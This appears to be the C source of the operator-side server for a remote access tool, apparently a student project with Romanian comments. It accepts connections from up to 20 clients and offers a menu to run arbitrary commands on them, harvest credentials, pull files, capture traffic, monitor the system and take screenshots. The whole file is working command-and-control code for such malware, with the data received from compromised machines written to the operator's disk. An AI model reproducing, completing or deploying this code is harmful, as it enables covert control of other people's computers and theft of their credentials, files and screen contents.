#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include "../commonutils.h"

#define PORT 8080
#define BUFFER_SIZE 1024*10

char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system \n 7. Screenshot the System \n 8. Return to clients menu ";

typedef struct client
{   
    int index;
    int sockID;
    struct sockaddr_in address;
};

struct client clients[20];
pthread_mutex_t client_mutex=PTHREAD_MUTEX_INITIALIZER;
pthread_t threads[20];
pthread_mutex_t connection_mutex=PTHREAD_MUTEX_INITIALIZER;
int connected_clients=0;

int current_window=0; //0 main menu 1 un client
pthread_mutex_t window_mutex=PTHREAD_MUTEX_INITIALIZER;
int active_client=-2;
pthread_mutex_t active_client_mutex=PTHREAD_MUTEX_INITIALIZER;

pthread_t display_thread;
pthread_t interaction_thread;

void add_client(int sockID,struct sockaddr_in client_addr)
{
    pthread_mutex_lock(&client_mutex);
    if(connected_clients<20)
    {
        clients[connected_clients].index=connected_clients;
        clients[connected_clients].sockID=sockID;
        clients[connected_clients].address=client_addr;
        connected_clients++;
    }
    pthread_mutex_unlock(&client_mutex);
}

void* client_connect(void *client_details)
{
    struct client client_data=*((struct client*)client_details);
    printf("Client with ID %d connected on socket %d\n",client_data.index,client_data.sockID);

    return NULL;

}

void exec_on_client(int clientfd)
{   
    char input_message[MAXLINE];
    strcpy(input_message,"Enter command to execute on client: ");
    write(STDOUT_FILENO,input_message,sizeof(input_message));

    char command[MAXLINE];

    read(STDIN_FILENO,command,sizeof(command));

    write(clientfd,command,strlen(command));

    char command_result[MAXLINE*MAXLINE];

    int recv_len;
    recv_len=recv(clientfd,command_result,MAXLINE*MAXLINE,0);

    write(STDOUT_FILENO,command_result,recv_len);
    write(STDOUT_FILENO,"\n",1);
}   

void get_credentials(int clientfd)
{
    /*char info_creds[8192*10];
    int recv_len;
    //recv_len=recvData(clientfd,info_creds);
    recv_len=recvData(clientfd,info_creds);
    write(STDOUT_FILENO,info_creds,recv_len);*/

    char sys_info[MAXLINE * 80] = "";
    char buffer[MAXLINE]; 
    int total_bytes_read = 0;
    int bytes_read; 

    sys_info[0]=0;

    int expected_size=0;
    int temp;
    recv(clientfd,&temp,sizeof(int),0);
    expected_size=ntohl(temp);
    printf("astept %d\n",expected_size);
    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
    {
        buffer[bytes_read] = '\0'; 
        strcat(sys_info, buffer);
        total_bytes_read += bytes_read;
        if(total_bytes_read==expected_size)
        {
            printf("%s\n",sys_info);
            return;
        }
    }

    if (total_bytes_read == 0) 
    {
        myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
    }

}

void get_system_info(int clientfd)
{
    char sys_info[MAXLINE * 10] = "";
    char buffer[MAXLINE]; 
    int total_bytes_read = 0;
    int bytes_read; 

    sys_info[0]=0;

    while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
    {
        buffer[bytes_read] = '\0'; 
        char *end_marker = strstr(buffer, "<END_OF_DATA>");
        if (end_marker != NULL) 
        {
            *end_marker = '\0';
            strcat(sys_info, buffer);
            myWrite("Sistem Information from client: \n",STDOUT_FILENO);
            myWrite(sys_info,STDOUT_FILENO);
            break; 
        }   
        strcat(sys_info, buffer);
        total_bytes_read += bytes_read;
        if (total_bytes_read >= sizeof(sys_info) - 1) 
        {
            myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
            break;
        }
        }
}

void screenshot_system(int clientfd)
{
    //char buffer[MAXLINE*1000];
    ssize_t bytes_read;
    int total_bytes = 0;
    FILE *fp = fopen("screenshot.png", "wb");
    
    if (!fp) {
        printf("Failed to create screenshot file\n");
        return;
    }

    printf("Receiving screenshot...\n");
    
    // char size[32];
    // read(clientfd,size,32);
    // char endline;
    // read(clientfd,&endline,1);

    // int is_finished=0;
    
    // while ((bytes_read = recv(clientfd, buffer, sizeof(buffer), 0)) > 0) {
    //     char *end_marker = strstr(buffer, "<END_OF_DATA>");
    //     if (end_marker != NULL) 
    //     {
    //         *end_marker = '\0';
    //     }  
    //     fwrite(buffer, 1, bytes_read, fp);
    //     total_bytes += bytes_read;
    //     printf("Received %d bytes\n", total_bytes);
    //     printf("%s",buffer);
    //     if(is_finished) break;
    // }

    // struct file_struct* received_file;
    // received_file=(struct file_struct*)malloc(sizeof(struct file_struct));

    // struct file_struct* aux=received_file;

    // int count=0;
    // int total=0;
    // while((count=recv(clientfd,&aux[total],sizeof(struct file_struct)-total,0))>0 && total<sizeof(struct file_struct))
    // {
    //     total+=count;
    //     printf("received %d",total);
        
    // }

    // printf("Received %d",received_file->file_size);

    // fwrite(received_file->file_bytes,1,received_file->file_size,fp);

    char Rbuffer[1024];
    int siz=1024;
    FILE *image;
    image = fopen("screenshot.png", "wb");
    int n;
    
    int total=0;
    unsigned int img_size;
    unsigned int tmp;
    recv(clientfd,&tmp,sizeof(int),0);
    img_size=ntohl(tmp);
    printf("Image size:%u",img_size);

    while((n=recv(clientfd,Rbuffer,siz,0))>0)
    {   
        total+=n;
        if (n<=0){
        perror("recv_size()");
        break;
         }
        fwrite(Rbuffer, sizeof(char), siz, image);
        printf("n: %d\n",n);
        printf("total: %d\n",total);
        if(img_size-total<siz) siz=img_size-total;
        if(total==img_size) break;

    }
    
    fclose(image);

    fclose(fp);
}

void get_system_monitor(int clientfd) {
    char buffer[BUFFER_SIZE] = {0};
    ssize_t bytes_read;
    size_t total = 0;
    
    struct timeval tv;
    tv.tv_sec = 5; 
    tv.tv_usec = 0;
    setsockopt(clientfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    
    printf("Waiting for system monitor data...\n");
    
    char ack[32] = {0};
    bytes_read = recv(clientfd, ack, sizeof(ack), 0);
    if (bytes_read <= 0 || !strstr(ack, "<ACK>")) {
        printf("No acknowledgment from client\n");
        return;
    }
    
    printf("Received acknowledgment, waiting for data...\n");
    
    while ((bytes_read = recv(clientfd, buffer + total, BUFFER_SIZE - total - 1, 0)) > 0) {
        total += bytes_read;
        buffer[total] = '\0';
        
        char *end = strstr(buffer, "<END_OF_DATA>");
        if (end) {
            *end = '\0';
            printf("Received system info:\n%s\n", buffer);
            return;
        }
    }
    
    if (bytes_read <= 0) {
        printf("Connection error or timeout\n");
    }
}
void flushSTDIN()
{
    int ch;
    while((ch=getchar())!='\n' && ch!=EOF);
}

void retrieve_file(int clientfd)
{
    struct file_struct file_to_retrieve;
    myWrite("Enter the absolute path of the file you want to retrieve: ",STDOUT_FILENO);

    memset(&file_to_retrieve,0,sizeof(struct file_struct));

    read(STDIN_FILENO,file_to_retrieve.file_name,100);
    file_to_retrieve.name_length=strlen(file_to_retrieve.file_name)-1;
    file_to_retrieve.file_size=0;


    write(clientfd,&file_to_retrieve,sizeof(file_to_retrieve));

    struct file_struct received_file;

    read(clientfd,&received_file,sizeof(received_file));

    printf("Name length: %d\n",received_file.name_length);
    printf("Name:%s\n",received_file.file_name);
    printf("Bytes received: %d\n",received_file.file_size);
    //printf("Received: %s",received_file.file_bytes);

    int fd=open(received_file.file_name,O_RDONLY);

    if(fd==-1)
    {
        fd=open(received_file.file_name,O_WRONLY|O_CREAT,0666);

        write(fd,received_file.file_bytes,received_file.file_size);
    }
     else 
     {
         myWrite("File already exists in server folder, replacing... ",STDOUT_FILENO);

        //  char conf;

        //  read(STDIN_FILENO,&conf,1);

        //  if(conf=='Y')
        //  {  
            printf("Replacing\n");
             close(fd);
             fd=open(received_file.file_name,O_WRONLY,0666);
             write(fd,received_file.file_bytes,received_file.file_size);
         //}

     }

}   

void capturetraffic(int clientfd)
{
    char capturedTraffic[MAXLINE*20]="";
    char buffer[MAXLINE];
    int total_bytes_read = 0;
    int bytes_read;

    capturedTraffic[0]=0;

    while((bytes_read=read(clientfd,buffer,sizeof(buffer)-1))>0)
    {
        buffer[bytes_read] = '\0'; 
        char *end_marker = strstr(buffer, "<END_OF_DATA>");
        if(end_marker!=NULL)
        {
            *end_marker='\0';
            myWrite(buffer,STDOUT_FILENO);
            break;
        }
        myWrite(buffer,STDOUT_FILENO);
    }

}

void* input_routine(void* args)
{   
    int connfd;
    while(1)
    {   
        //write(STDOUT_FILENO,options,strlen(options));
        char opt;
        read(STDIN_FILENO,&opt,sizeof(opt));
        flushSTDIN(); 
        switch(opt)
        {   
            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
            case '1':
                write(connfd,"1",1);
                exec_on_client(connfd);
                //flushSocketRead(connfd);
                break;
            case '2':
                write(connfd,"2",1);
                get_credentials(connfd);
                //flushSocketRead(connfd);
                break;
            case '3':
                write(connfd, "3", 1);
                get_system_info(connfd);
                //flushSocketRead(connfd);
                break;
            case '4':
                write(connfd,"4",1);
                retrieve_file(connfd);
                //flushSocketRead(connfd);
                break;
            case '5':
                write(connfd,"5",1);
                capturetraffic(connfd);
                //flushSocketRead(connfd);
                break;
            case '6':
                write(connfd, "6", 1);
                get_system_monitor(connfd);
                break;
            case '7':
                write(connfd, "7", 1);
                screenshot_system(connfd);
                break;
            default:
                break;
        }
    }
}

void* client_interaction_thread(void* args) {
    while (1) {
        pthread_mutex_lock(&active_client_mutex);
        int client_id = active_client;
        pthread_mutex_unlock(&active_client_mutex);

        if (client_id < 0) {
            sleep(1); 
            continue;
        }

        pthread_mutex_lock(&client_mutex);
        int client_sock = clients[client_id].sockID;
        pthread_mutex_unlock(&client_mutex);

        printf("Interacting with client #%d\n", client_id);
        printf("%s\n", options);
        printf("Enter option: ");

        char option;
        scanf(" %c", &option);

        switch (option) {
            case '1':
                write(client_sock, "1", 1);
                exec_on_client(client_sock);
                break;
            case '2':
                write(client_sock, "2", 1);
                get_credentials(client_sock);
                break;
            case '3':
                write(client_sock, "3", 1);
                get_system_info(client_sock);
                break;
            case '4':
                write(client_sock, "4", 1);
                retrieve_file(client_sock);
                break;
            case '5':
                write(client_sock, "5", 1);
                capturetraffic(client_sock);
                break;
            case '6':
                write(client_sock, "6", 1);
                get_system_monitor(client_sock);
                break;
            case '7':  
                write(client_sock, "7", 1);
                screenshot_system(client_sock);
                break;
            case '8':
                pthread_mutex_lock(&active_client_mutex);
                active_client = -2;
                pthread_mutex_unlock(&active_client_mutex);
                break;
            default:
                printf("Invalid option!\n");
                break;
        }
    }
    return NULL;
}


void* mainmenu_display(void * args)
{   
    while (1) {

        if(active_client==-2)
        {
        pthread_mutex_lock(&client_mutex);
        system("clear");
        printf("Connected clients:\n");

        for (int i = 0; i < connected_clients; i++) {
            printf("Client #%d | Socket: %d | IP: %s\n", 
                clients[i].index, 
                clients[i].sockID,
                inet_ntoa(clients[i].address.sin_addr)
            );
        }
        pthread_mutex_unlock(&client_mutex);

        printf("\nEnter the client number to interact with (or -1 to exit): ");
        int selected_client;
        scanf("%d", &selected_client);

        if (selected_client == -1) {
            exit(0); 
        }

        pthread_mutex_lock(&active_client_mutex);
        active_client = selected_client;
        pthread_mutex_unlock(&active_client_mutex);

        
        }
        
    }
    return NULL;
}

int main()
{
    for(int i=0;i<20;i++)
    {
        clients[i].index=0;
        clients[i].sockID=0;
        memset(&(clients[i].address),0,sizeof(struct sockaddr_in));
    }
    pthread_create(&display_thread,0,mainmenu_display,0);
    pthread_create(&interaction_thread, NULL, client_interaction_thread, NULL);

    setvbuf(stdout,0,_IONBF,0);

    int sockfd;
    char buffer[MAXLINE];
    struct sockaddr_in servaddr;

    sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(sockfd<0)
    {
        perror("socket creation failed\n");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr,0,sizeof(servaddr));

    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(PORT);
    servaddr.sin_addr.s_addr=INADDR_ANY;

    if(bind(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr))<0)
    {
        perror("socket bind failed\n");
        exit(EXIT_FAILURE);
    }

    if(listen(sockfd,20)<0)
    {
        perror("socket listen error\n");
        exit(EXIT_FAILURE);
    }
    else 
        printf("Server listening...\n");
    
    struct sockaddr_in client_addr;
    int connfd;
    int len=sizeof(client_addr);


    while(1)
    {
        if((connfd=accept(sockfd,(struct sockaddr*) &client_addr,&len))>0)
        {
            if(connfd<0){
            perror("server accept error\n");
            exit(EXIT_FAILURE);
            }
            //else printf("Server accepted client connection\n");

            struct client* new_client=malloc(sizeof(struct client));

            new_client->index=connected_clients;
            new_client->sockID=connfd;
            new_client->address.sin_addr=client_addr.sin_addr;

            add_client(connfd,client_addr);

            pthread_create(&threads[connected_clients-1],NULL,client_connect,new_client);

        }
    }

    /*while(1)
    {   
        write(STDOUT_FILENO,options,strlen(options));
        char opt;
        read(STDIN_FILENO,&opt,sizeof(opt));
        flushSTDIN(); 
        switch(opt)
        {   
            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
            case '1':
            write(connfd,"1",1);
            exec_on_client(connfd);
            //flushSocketRead(connfd);
            break;
            case '2':
            write(connfd,"2",1);
            get_credentials(connfd);
            //flushSocketRead(connfd);
            break;
            case '3':
            write(connfd, "3", 1);
            get_system_info(connfd);
            //flushSocketRead(connfd);
            break;
            case '4':
            write(connfd,"4",1);
            retrieve_file(connfd);
            //flushSocketRead(connfd);
            case '5':
            write(connfd,"5",1);
            capturetraffic(connfd);
            //IN LUCRU
            //case '6':
            //write(connfd, "6", 1);
            //get_system_monitor(connfd);
            //break;
            default:
            break;

        }

    }
    */
    
    pthread_join(display_thread, NULL);
    pthread_join(interaction_thread, NULL);

    close(connfd);
    
    return 0;
}